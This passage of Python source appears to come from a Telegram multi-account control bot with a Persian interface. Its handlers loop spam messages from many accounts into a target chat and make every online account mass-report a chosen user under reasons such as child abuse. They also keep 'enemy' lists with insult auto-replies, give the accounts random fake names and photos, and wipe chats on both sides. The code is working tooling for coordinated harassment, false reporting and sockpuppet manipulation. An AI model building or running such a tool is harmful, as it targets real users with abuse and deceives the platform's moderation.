                        ]
                        txt_pool = [{"kind": "text", "val": t} for t in text_list]
                        med_pool = [{"kind": "media", "val": m} for m in all_media]
                        if not txt_pool and not med_pool:
                            await asyncio.sleep(interval)
                            continue

                        if txt_pool and med_pool:
                            pick = random.choice(txt_pool if random.random() < 0.5 else med_pool)
                        elif txt_pool:
                            pick = random.choice(txt_pool)
                        else:
                            pick = random.choice(med_pool)

                        try:
                            # find last message sent by this account in target chat
                            msgs = await c.get_messages(tgt, limit=20)
                            last_mine = next(
                                (m for m in msgs if m.sender_id == my_uid and not getattr(m, "action", None)),
                                None
                            )
                            reply_to = last_mine.id if last_mine else None

                            # send (reply to own last msg if found, otherwise send fresh)
                            if pick["kind"] == "text":
                                await c.send_message(tgt, pick["val"], reply_to=reply_to)
                            else:
                                m = pick["val"]
                                await c.send_file(tgt, m["path"],
                                                  caption=m.get("caption") or None,
                                                  reply_to=reply_to)
                        except FloodWaitError as fe:
                            wait = fe.seconds + random.randint(3, 8)
                            _bself_flood_cd[sname] = time.time() + wait
                            log.warning(f"[bself_iv:{gname}:{sname}] FloodWait {fe.seconds}s — cooldown {wait}s")
                        except asyncio.CancelledError:
                            raise
                        except Exception as se:
                            log.warning(f"[bself_iv:{gname}:{sname}] send err: {se}")

                        # ── wait interval before next account ──
                        await asyncio.sleep(interval)

              except asyncio.CancelledError:
                    break
              except Exception as _le:
                    log.warning(f"[bself_iv:{gname}] outer err: {_le}")
                    await asyncio.sleep(5)

      _bself_loop_tasks[gname] = asyncio.create_task(_bself_iv_loop())
      await sp_edit(event, _bself_loop_panel_text(gname), buttons=_bself_loop_panel_buttons(gname), parse_mode="html")
      await event.answer(" Interval Reply شروع شد", alert=True)

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_bself_loopstop_(.+)")))
    async def og_bself_loopstop_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer("")
      task = _bself_loop_tasks.pop(gname, None)
      if task and not task.done():
          task.cancel()
      await sp_edit(event, _bself_loop_panel_text(gname), buttons=_bself_loop_panel_buttons(gname), parse_mode="html")
      await event.answer(" Interval Reply متوقف شد", alert=True)

    # ═══════════════════════════════════════════════════════════
    # ═══════════════════════════════════════════════════════════
    # ═══════════════════════════════════════════════════════════
    # ═══════════════════════════════════════════════════════════
    # BLOCK BY ID — all group accounts block a Telegram user ID
    # ═══════════════════════════════════════════════════════════
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_blockid_(.+)")))
    async def og_blockid_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      pending_group_selection[event.sender_id] = {"og_step": "blockid", "og_gname": gname}
      await sp_edit(event,
          f" Block by ID — ریموت {gname}:\n"
          f"آیدی عددی کاربر رو بفرست (مثال: 123456789)\n"
          f"همه اکانت‌های آنلاین ریموت اونو بلاک میکنن.",
          buttons=[[Button.inline("❌ Cancel", f"og_home_{gname}".encode())]])
      await event.answer()

    # ═══════════════════════════════════════════════════════════
    # REPORT USER — all group accounts report a Telegram user
    # ═══════════════════════════════════════════════════════════
    _REPORT_REASONS = {
      "spam":     (" Spam",            "InputReportReasonSpam"),
      "fake":     (" Fake Account",     "InputReportReasonFake"),
      "violence": (" Violence",         "InputReportReasonViolence"),
      "porn":     (" Pornography",      "InputReportReasonPornography"),
      "child":    (" Child Abuse",      "InputReportReasonChildAbuse"),
      "drugs":    (" Illegal Drugs",    "InputReportReasonIllegalDrugs"),
      "personal": (" Personal Details", "InputReportReasonPersonalDetails"),
      "copy":     (" Copyright",        "InputReportReasonCopyright"),
      "other":    (" Other",            "InputReportReasonOther"),
    }

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_report_(.+)")))
    async def og_report_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      pending_group_selection[event.sender_id] = {"og_step": "report_id", "og_gname": gname}
      pending_group_selection[event.sender_id] = {"og_step": "report_id", "og_gname": gname}
      await sp_edit(event,
          " Report User — ریموت " + gname + ":\n"
          "آیدی عددی کاربر رو بفرست (مثال: 123456789)\n"
          "همه اکانت‌های آنلاین ریموت گزارش میدن.",
          buttons=[[Button.inline("❌ Cancel", f"og_home_{gname}".encode())]])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_rpt_([^|]+)\|(.+)")))
    async def og_rpt_cb(event):
      reason_key = event.pattern_match.group(1).decode()
      gname = event.pattern_match.group(2).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      pend = pending_group_selection.get(event.sender_id) or pending_group_selection.get(OWNER_ID, {})
      target_uid = pend.get("report_uid")
      if not target_uid:
          return await event.answer(" آیدی ذخیره نشده. دوباره از اول شروع کن.", alert=True)
      reason_info = _REPORT_REASONS.get(reason_key)
      if not reason_info:
          return await event.answer(" دلیل نامعتبر", alert=True)
      reason_label, reason_class = reason_info
      pending_group_selection.pop(event.sender_id, None)
      pending_group_selection.pop(OWNER_ID, None)
      await event.answer(f" در حال ریپورت با دلیل {reason_label}...")
      import telethon.tl.types as _tlt
      reason_obj = getattr(_tlt, reason_class, None)
      if reason_obj is None:
          await sp_edit(event, f" کلاس {reason_class} پیدا نشد.",
                         buttons=[[Button.inline("👥 Group", f"og_home_{gname}".encode())]])
          return
      ok = fail = 0
      from telethon.tl.functions.account import ReportPeerRequest as _RPR
      for s in og_sessions(gname):
          meta = managed.get(s)
          if not meta:
              continue
          try:
              # resolve entity per-session to get correct access_hash
              try:
                    _peer = await meta["client"].get_input_entity(target_uid)
              except Exception:
                    from telethon.tl.types import InputPeerUser as _IPU
                    _peer = _IPU(user_id=target_uid, access_hash=0)
              await meta["client"](_RPR(peer=_peer, reason=reason_obj(), message=""))
              ok += 1
          except Exception as _e:
              log.warning(f"[report] {s} -> {target_uid}: {_e}")
              fail += 1
      await sp_edit(event,
          f" Report نتیجه — {target_uid}\n"
          f"━━━━━━━━━━━━━━\n"
          f"دلیل: {reason_label}\n"
          f" موفق: {ok}   خطا: {fail}",
          buttons=[[Button.inline("👥 Group", f"og_home_{gname}".encode())]])

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_enadd_([^|]+)\|(.+)")))
    async def og_enadd_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sess = event.pattern_match.group(2).decode()
      pending_group_selection[event.sender_id] = {"og_step": "enadd", "og_gname": gname, "og_sess": sess}
      await sp_edit(event, f" آیدی دشمن برای {sess}:\n(عدد یا @username)",
                     buttons=[[Button.inline("❌ Cancel", f"og_en1_{gname}|{sess}".encode())]])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_endel_([^|]+)\|(.+)")))
    async def og_endel_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sess = event.pattern_match.group(2).decode()
      pending_group_selection[event.sender_id] = {"og_step": "endel", "og_gname": gname, "og_sess": sess}
      await sp_edit(event, f" آیدی دشمنی که حذف بشه از {sess}:",
                     buttons=[[Button.inline("❌ Cancel", f"og_en1_{gname}|{sess}".encode())]])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_enclr_([^|]+)\|(.+)")))
    async def og_enclr_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sess = event.pattern_match.group(2).decode()
      meta = managed.get(sess)
      if meta:
          meta["state"]["locked_auto_reply"] = set()
          save_session_state(sess, meta["state"])
      await event.answer(f" آیدی‌های Self {sess} پاک شد")
      await sp_edit(event, f" آیدی‌های Self {sess} پاک شدن.",
                     buttons=[[Button.inline("🔙 Back", f"og_en1_{gname}|{sess}".encode())]])

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_enfosh_([^|]+)\|(.+)")))
    async def og_enfosh_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sess = event.pattern_match.group(2).decode()
      pending_group_selection[event.sender_id] = {"og_step": "enfosh", "og_gname": gname, "og_sess": sess}
      await sp_edit(event, f" متن‌های Self برای {sess}:\nهر پیام یه آیتم. /done برای پایان.",
                     buttons=[[Button.inline("❌ Cancel", f"og_en1_{gname}|{sess}".encode())]])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_enmedia_(photo|gif|video|sticker)_([^|]+)\|(.+)")))
    async def og_enmedia_cb(event):
      if not og_guard(event, event.pattern_match.group(2).decode()):
          return await event.answer(" دسترسی ندارید", alert=True)
      mtype = event.pattern_match.group(1).decode()
      gname = event.pattern_match.group(2).decode()
      sess = event.pattern_match.group(3).decode()
      emoji = {"photo": "", "gif": "", "video": "", "sticker": ""}.get(mtype, "")
      pending_group_selection[event.sender_id] = {"og_step": "enfosh_media", "og_gname": gname, "og_sess": sess, "og_mtype": mtype}
      meta = managed.get(sess)
      raw_media = meta["state"].get("self_reply_media", []) if meta else []
      cnt = sum(1 for m in raw_media if isinstance(m, dict) and m.get("type") == mtype)
      await sp_edit(event,
          f"{emoji} آپلود {mtype} برای Self — {sess}\nتعداد فعلی: {cnt}\n\n"
          f"{emoji} فایل بفرست (کپشن هم میتونی بذاری):",
          buttons=[[Button.inline("❌ Cancel", f"og_en1_{gname}|{sess}".encode())]])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_enclrmedia_([^|]+)\|(.+)")))
    async def og_enclrmedia_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sess = event.pattern_match.group(2).decode()
      meta = managed.get(sess)
      if meta:
          meta["state"]["self_reply_media"] = []
          save_session_state(sess, meta["state"])
      await event.answer(" مدیاهای Self پاک شد")
      await sp_edit(event, f" مدیاهای Self {sess} پاک شدن.",
                     buttons=[[Button.inline("🔙 Back", f"og_en1_{gname}|{sess}".encode())]])

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_enclrtype_(photo|gif|video|sticker)_([^|]+)\|(.+)")))
    async def og_enclrtype_cb(event):
      mtype = event.pattern_match.group(1).decode()
      gname = event.pattern_match.group(2).decode()
      sess = event.pattern_match.group(3).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      meta = managed.get(sess)
      removed = 0
      if meta:
          before = len(meta["state"].get("self_reply_media", []))
          meta["state"]["self_reply_media"] = [
              m for m in meta["state"].get("self_reply_media", [])
              if not (isinstance(m, dict) and m.get("type") == mtype)
          ]
          removed = before - len(meta["state"]["self_reply_media"])
          save_session_state(sess, meta["state"])
      emoji_map = {"photo": "", "gif": "", "video": "", "sticker": ""}
      emoji = emoji_map.get(mtype, "")
      await event.answer(f" {removed} {mtype} حذف شد")
      await sp_edit(event, f" {emoji} {removed} آیتم از Self {sess} پاک شد.",
                     buttons=[[Button.inline("🔙 Back", f"og_en1_{gname}|{sess}".encode())]])

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_enclrtext_([^|]+)\|(.+)")))
    async def og_enclrtext_cb(event):
      gname = event.pattern_match.group(1).decode()
      sess = event.pattern_match.group(2).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      meta = managed.get(sess)
      cnt = 0
      if meta:
          cnt = len(meta["state"].get("self_reply_text", []))
          meta["state"]["self_reply_text"] = []
          save_session_state(sess, meta["state"])
      await event.answer(f" {cnt} متن حذف شد")
      await sp_edit(event, f" {cnt} متن Self {sess} پاک شد.",
                     buttons=[[Button.inline("🔙 Back", f"og_en1_{gname}|{sess}".encode())]])

    # ═══════════════════════════════════════════════════════════
    # OWNER GROUP: PROFILE PANEL  (og_profile_ prefix)
    # ═══════════════════════════════════════════════════════════
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_profile_(.+)")))
    async def og_profile_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      rows = [[Button.inline("📌 Bulk (All Accounts)", f"og_prfbulk_{gname}".encode())]]
      rows += [[Button.inline(f"🗂 {'🟢' if s in managed else '🔴'} {s}", f"og_prf1_{gname}|{s}".encode())]
              for s in og_sessions(gname)]
      rows.append([Button.inline("🔙 Back", f"og_home_{gname}".encode())])
      await sp_edit(event, f" Profile — ریموت {gname}:\nانتخاب کن:", buttons=rows)
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_prf1_([^|]+)\|(.+)")))
    async def og_prf1_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sess = event.pattern_match.group(2).decode()
      meta = managed.get(sess)
      if not meta:
          return await event.answer(" آفلاین")
      try:
          me = await meta["client"].get_me()
          name = f"{me.first_name or ''} {me.last_name or ''}".strip()
          bio_obj = await meta["client"](functions.users.GetFullUserRequest(me))
          bio = bio_obj.full_user.about or "—"
      except Exception:
          name = sess
          bio = "—"
      txt = (
          f" Profile — {sess}\n━━━━━━━━━━━━━━\n"
          f"نام: {name}\n"
          f"بیو: {bio}"
      )
      await sp_edit(event, txt, buttons=[
          [Button.inline("🔄 Change Name", f"og_prfname_{gname}|{sess}".encode()),
             Button.inline("🔄 Change Bio", f"og_prfbio_{gname}|{sess}".encode())],
          [Button.inline("🖼 Change Profile Photo", f"og_prfphoto_{gname}|{sess}".encode()),
             Button.inline("📌 Delete All Photos", f"og_prfdelphoto_{gname}|{sess}".encode())],
          [Button.inline("🔙 Back", f"og_profile_{gname}".encode())],
      ])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_prfname_([^|]+)\|(.+)")))
    async def og_prfname_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sess = event.pattern_match.group(2).decode()
      pending_group_selection[event.sender_id] = {"og_step": "prfname", "og_gname": gname, "og_sess": sess}
      await sp_edit(event, f" نام جدید برای {sess}:\n(نام | نام_خانوادگی — جدا با اسپیس)",
                     buttons=[[Button.inline("❌ Cancel", f"og_prf1_{gname}|{sess}".encode())]])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_prfbio_([^|]+)\|(.+)")))
    async def og_prfbio_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sess = event.pattern_match.group(2).decode()
      pending_group_selection[event.sender_id] = {"og_step": "prfbio", "og_gname": gname, "og_sess": sess}
      await sp_edit(event, f" بیو جدید برای {sess}:\n(حداکثر 70 کاراکتر)",
                     buttons=[[Button.inline("❌ Cancel", f"og_prf1_{gname}|{sess}".encode())]])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_prfphoto_([^|]+)\|(.+)")))
    async def og_prfphoto_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sess = event.pattern_match.group(2).decode()
      pending_group_selection[event.sender_id] = {"og_step": "prfphoto", "og_gname": gname, "og_sess": sess}
      await sp_edit(event, f" Photo پروفایل جدید برای {sess}:\nعکس رو اینجا بفرست:",
                     buttons=[[Button.inline("❌ Cancel", f"og_prf1_{gname}|{sess}".encode())]])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_prfdelphoto_([^|]+)\|(.+)")))
    async def og_prfdelphoto_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sess = event.pattern_match.group(2).decode()
      meta = managed.get(sess)
      if not meta:
          return await event.answer(" آفلاین")
      await event.answer(" در حال حذف...")
      try:
          from telethon.tl.functions.photos import GetUserPhotosRequest, DeletePhotosRequest
          from telethon.tl.types import InputPhoto
          result = await meta["client"](GetUserPhotosRequest(
              user_id="me", offset=0, max_id=0, limit=100))
          photos = result.photos
          if not photos:
              await sp_edit(event, f" {sess} عکس پروفایلی نداره.",
                             buttons=[[Button.inline("🔙 Back", f"og_prf1_{gname}|{sess}".encode())]])
              return
          input_photos = [
              InputPhoto(id=p.id, access_hash=p.access_hash,
                           file_reference=p.file_reference)
              for p in photos
          ]
          await meta["client"](DeletePhotosRequest(id=input_photos))
          await sp_edit(event, f" {len(photos)} عکس پروفایل {sess} حذف شد.",
                         buttons=[[Button.inline("🔙 Back", f"og_prf1_{gname}|{sess}".encode())]])
      except Exception as e:
          await sp_edit(event, f" خطا: {e}",
                         buttons=[[Button.inline("🔙 Back", f"og_prf1_{gname}|{sess}".encode())]])

    # ═══════════════════════════════════════════════════════════
    # OWNER GROUP: BULK PROFILE PANEL  (og_prfbulk_ prefix)
    # ═══════════════════════════════════════════════════════════
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_prfbulk_(.+)")))
    async def og_prfbulk_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sessions = og_sessions(gname)
      online = sum(1 for s in sessions if s in managed)
      await sp_edit(event,
          f" پروفایل همگانی — ریموت {gname}\n━━━━━━━━━━━━━━\n"
          f" اکانت: {len(sessions)}   آنلاین: {online}\n\n"
          f"تغییر روی همه اکانت‌های آنلاین اعمال می‌شه:",
          buttons=[
              [Button.inline("📌 All Names", f"og_prfbulknm_{gname}".encode()),
                 Button.inline("📌 All Bios", f"og_prfbulkbio_{gname}".encode())],
              [Button.inline("🏷 Random Names", f"og_prfbulkrn_{gname}".encode())],
              [Button.inline("📌 All Photos", f"og_prfbulkpht_{gname}".encode())],
              [Button.inline("📌 Delete All Photos", f"og_prfbulkdph_{gname}".encode())],
              [Button.inline("🔙 Back", f"og_profile_{gname}".encode())],
          ])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_prfbulknm_(.+)")))
    async def og_prfbulknm_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      pending_group_selection[event.sender_id] = {"og_step": "og_prfall_name", "og_gname": gname}
      await sp_edit(event,
          f" نام جدید برای همه اکانت‌های ریموت «{gname}»:\n(نام | نام_خانوادگی — جدا با اسپیس)",
          buttons=[[Button.inline("❌ Cancel", f"og_prfbulk_{gname}".encode())]])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_prfbulkrn_(.+)")))
    async def og_prfbulkrn_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      await event.answer(" در حال تولید اسم‌های رندوم...")
      sessions = [s for s in og_sessions(gname) if s in managed]
      if not sessions:
          return await sp_edit(event, " هیچ اکانت آنلاینی وجود نداره.",
              buttons=[[Button.inline("🔙 Back", f"og_prfbulk_{gname}".encode())]])
      names = _gen_unique_random_names(len(sessions))
      ok, fail = 0, []
      for sess, (fn, ln) in zip(sessions, names):
          meta = managed.get(sess)
          if not meta:
              fail.append(sess)
              continue
          try:
              await meta["client"](functions.account.UpdateProfileRequest(
                    first_name=fn, last_name=ln))
              ok += 1
              await asyncio.sleep(1.2)
          except Exception as _e:
              fail.append(f"{sess}: {str(_e)[:40]}")
      txt = (f" Random Names — {gname}\n━━━━━━━━━━━━━━\n"
               f" موفق: {ok}   ناموفق: {len(fail)}\n")
      if fail:
          txt += "\n".join(fail[:10])
      await sp_edit(event, txt,
          buttons=[[Button.inline("🔙 Back", f"og_prfbulk_{gname}".encode())]])

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_prfbulkbio_(.+)")))
    async def og_prfbulkbio_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      pending_group_selection[event.sender_id] = {"og_step": "og_prfall_bio", "og_gname": gname}
      await sp_edit(event,
          f" بیو جدید برای همه اکانت‌های ریموت «{gname}»:\n(حداکثر 70 کاراکتر)",
          buttons=[[Button.inline("❌ Cancel", f"og_prfbulk_{gname}".encode())]])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_prfbulkpht_(.+)")))
    async def og_prfbulkpht_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      pending_group_selection[event.sender_id] = {"og_step": "og_prfall_photo", "og_gname": gname}
      await sp_edit(event,
          f" Photo پروفایل جدید برای همه اکانت‌های ریموت «{gname}»:\nعکس رو اینجا بفرست:",
          buttons=[[Button.inline("❌ Cancel", f"og_prfbulk_{gname}".encode())]])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_prfbulkdph_(.+)")))
    async def og_prfbulkdph_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sessions = og_sessions(gname)
      await event.answer(" در حال حذف...")
      from telethon.tl.functions.photos import GetUserPhotosRequest, DeletePhotosRequest
      from telethon.tl.types import InputPhoto
      ok = fail = skipped = 0
      for s in sessions:
          meta = managed.get(s)
          if not meta:
              skipped += 1
              continue
          try:
              result = await meta["client"](GetUserPhotosRequest(
                    user_id="me", offset=0, max_id=0, limit=100))
              photos = result.photos
              if not photos:
                    skipped += 1
                    continue
              input_photos = [
                    InputPhoto(id=p.id, access_hash=p.access_hash,
                               file_reference=p.file_reference)
                    for p in photos
              ]
              await meta["client"](DeletePhotosRequest(id=input_photos))
              ok += 1
              await asyncio.sleep(2)
          except Exception:
              fail += 1
      await sp(event.chat_id,
          f" Delete Photosی پروفایل همگانی تموم شد!\n━━━━━━━━━━━━━━\n"
          f" موفق: {ok}   ناموفق: {fail}   آفلاین: {skipped}",
          buttons=[[Button.inline("🔙 Back", f"og_prfbulk_{gname}".encode())]])

    # ═══════════════════════════════════════════════════════════
    # OWNER GROUP: ACCOUNT CLEANER  (og_clean_ prefix)
    # ═══════════════════════════════════════════════════════════
    async def _og_run_clean(client):
      """Delete owned channels, leave all groups/channels, block bots, clear private history, delete contacts."""
      from telethon.tl.functions.channels import DeleteChannelRequest, LeaveChannelRequest
      from telethon.tl.functions.messages import DeleteHistoryRequest, DeleteChatUserRequest
      from telethon.tl.functions.contacts import BlockRequest, DeleteContactsRequest, GetContactsRequest
      from telethon.tl import types as _tlt
      owned_del = left = privates = bots_blocked = contacts_deleted = 0
      try:
          dialogs = await client.get_dialogs(limit=None)
      except Exception:
          dialogs = []
      me = None
      try:
          me = await client.get_me()
      except Exception:
          pass
      for d in dialogs:
          ent = d.entity
          try:
              if isinstance(ent, _tlt.Channel):
                    if getattr(ent, 'creator', False):
                        await client(DeleteChannelRequest(ent))
                        owned_del += 1
                    else:
                        await client(LeaveChannelRequest(ent))
                        left += 1
                    await asyncio.sleep(0.5)
              elif isinstance(ent, _tlt.Chat):
                    if not getattr(ent, 'deactivated', False) and me:
                        try:
                            await client(DeleteChatUserRequest(chat_id=ent.id, user_id=me))
                        except Exception:
                            pass
                        left += 1
                    await asyncio.sleep(0.5)
              elif isinstance(ent, _tlt.User) and not getattr(ent, 'is_self', False):
                    is_bot = getattr(ent, 'bot', False)
                    if is_bot:
                        # Block the bot then wipe history
                        try:
                            await client(BlockRequest(id=ent))
                        except Exception:
                            pass
                        try:
                            await client(DeleteHistoryRequest(peer=ent, max_id=0, revoke=True))
                        except Exception:
                            pass
                        bots_blocked += 1
                    else:
                        # Regular user or deleted account — wipe two-sided
                        await client(DeleteHistoryRequest(peer=ent, max_id=0, revoke=True))
                        privates += 1
                    await asyncio.sleep(0.3)
          except Exception as e:
              log.warning(f"[og_clean] err on {getattr(ent, 'id', '?')}: {e}")
      # Delete all contacts
      try:
          contacts_result = await client(GetContactsRequest(hash=0))
          if hasattr(contacts_result, 'users') and contacts_result.users:
              user_ids = [u.id for u in contacts_result.users if not getattr(u, 'is_self', False)]
              if user_ids:
                    await client(DeleteContactsRequest(id=user_ids))
                    contacts_deleted = len(user_ids)
                    await asyncio.sleep(0.5)
      except Exception as e:
          log.warning(f"[og_clean] contacts delete err: {e}")
      return owned_del, left, privates, bots_blocked, contacts_deleted

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_clean_(.+)")))
    async def og_clean_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sessions = og_sessions(gname)
      rows = [[Button.inline("📌 Clean All Accounts", f"og_cleanall_{gname}".encode())]]
      for s in sessions:
          icon = "🟢" if s in managed else "🔴"
          rows.append([Button.inline(f"🔢 {icon} Clean {s}", f"og_clean1_{gname}|{s}".encode())])
      rows.append([Button.inline("🔙 Back", f"og_home_{gname}".encode())])
      await sp_edit(event,
          f" Clean Account — ریموت {gname}\n━━━━━━━━━━━━━━\n"
          f" این عملیات برگشت‌ناپذیره!\n\n"
          f"• چنل‌هایی که مالکشه حذف می‌شن\n"
          f"• از کل گروه‌ها و چنل‌ها لفت می‌ده\n"
          f"• کل پیوی‌ها دو طرفه پاک می‌شن\n"
          f"• کل مخاطبان حذف می‌شن\n\n"
          f"اکانت رو انتخاب کن:",
          buttons=rows)
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_clean1_([^|]+)\|(.+)")))
    async def og_clean1_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sess = event.pattern_match.group(2).decode()
      await sp_edit(event,
          f" تأیید پاک‌سازی — {sess}\n━━━━━━━━━━━━━━\n"
          f" چنل‌هایی که ساختی حذف می‌کنه\n"
          f" از کل گروه‌ها و چنل‌ها لفت می‌ده\n"
          f" کل پیوی‌ها رو دو طرفه پاک می‌کنه\n"
          f" کل مخاطبان رو حذف می‌کنه\n\n"
          f"مطمئنی؟",
          buttons=[
              [Button.inline(f"✅ Yes — Clean {sess}", f"og_cleando_{gname}|{sess}".encode())],
              [Button.inline("❌ Cancel", f"og_clean_{gname}".encode())],
          ])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_cleando_([^|]+)\|(.+)")))
    async def og_cleando_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sess = event.pattern_match.group(2).decode()
      meta = managed.get(sess)
      if not meta:
          return await event.answer(" اکانت آفلاینه — اول روشنش کن", alert=True)
      await event.answer(" شروع شد...")
      await sp_edit(event,
          f" پاک‌سازی {sess} در حال اجراست...\nبعد از اتمام نتیجه نشون داده می‌شه.",
          buttons=[[Button.inline("📋 Menu", f"og_home_{gname}".encode())]])

      async def _do_clean():
          try:
              owned, lft, privs, bots, contacts = await _og_run_clean(meta["client"])
              await bot.send_message(event.chat_id,
                    f" پاک‌سازی {sess} تموم شد!\n━━━━━━━━━━━━━━\n"
                    f" چنل‌های حذف‌شده: {owned}\n"
                    f" لفت‌شده: {lft}\n"
                    f" پیوی‌های پاک‌شده: {privs}\n"
                    f" ربات‌های بلاک‌شده: {bots}\n"
                    f" مخاطبان حذف‌شده: {contacts}",
                    buttons=[[Button.inline("🧹 Cleaner", f"og_clean_{gname}".encode()),
                              Button.inline("📋 Menu", f"og_home_{gname}".encode())]])
          except Exception as e:
              await bot.send_message(event.chat_id, f" خطا در پاک‌سازی {sess}: {e}")
      asyncio.get_event_loop().create_task(_do_clean())

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_cleanall_(.+)")))
    async def og_cleanall_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      online = [s for s in og_sessions(gname) if s in managed]
      await sp_edit(event,
          f" تأیید پاک‌سازی همه — ریموت {gname}\n━━━━━━━━━━━━━━\n"
          f" {len(online)} اکانت آنلاین پاک‌سازی می‌شن\n\n"
          f" چنل‌های ساخته‌شده حذف می‌کنه\n"
          f" از کل گروه‌ها و چنل‌ها لفت می‌ده\n"
          f" کل پیوی‌ها رو دو طرفه پاک می‌کنه\n"
          f" کل مخاطبان حذف می‌شن\n\n"
          f"مطمئنی؟",
          buttons=[
              [Button.inline(f"✅ Yes — Clean All ({len(online)})", f"og_cleandoall_{gname}".encode())],
              [Button.inline("❌ Cancel", f"og_clean_{gname}".encode())],
          ])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_cleandoall_(.+)")))
    async def og_cleandoall_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      online = [s for s in og_sessions(gname) if s in managed]
      if not online:
          return await event.answer(" هیچ اکانت آنلاینی نیست", alert=True)
      await event.answer(" شروع شد...")
      await sp_edit(event,
          f" پاک‌سازی همگانی ریموت {gname} شروع شد...\n{len(online)} اکانت در صف.",
          buttons=[[Button.inline("📋 Menu", f"og_home_{gname}".encode())]])

      async def _do_clean_all():
          results = []
          for s in online:
              meta = managed.get(s)
              if not meta:
                    results.append(f"• {s}:  آفلاین")
                    continue
              try:
                    owned, lft, privs, bots, contacts = await _og_run_clean(meta["client"])
                    results.append(f"• {s}:  {owned} حذف | {lft} لفت | {privs} پیوی | {bots} | {contacts} مخاطب")
                    await asyncio.sleep(2)
              except Exception as e:
                    results.append(f"• {s}:  {e}")
          await bot.send_message(event.chat_id,
